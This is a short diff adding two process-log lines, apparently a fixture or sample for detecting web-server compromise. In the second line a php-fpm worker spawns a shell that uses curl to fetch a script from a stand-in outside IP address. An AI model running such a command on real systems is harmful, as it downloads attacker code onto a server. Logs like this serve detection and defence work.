@@ -1,0 +1,2 @@
+2026-07-08T02:14:12Z pid=2201 ppid=811 user=www-data command=php-fpm: pool www
+2026-07-08T02:14:12Z pid=2202 ppid=2201 user=www-data command=/bin/sh -c curl http://203.0.113.9/p.sh
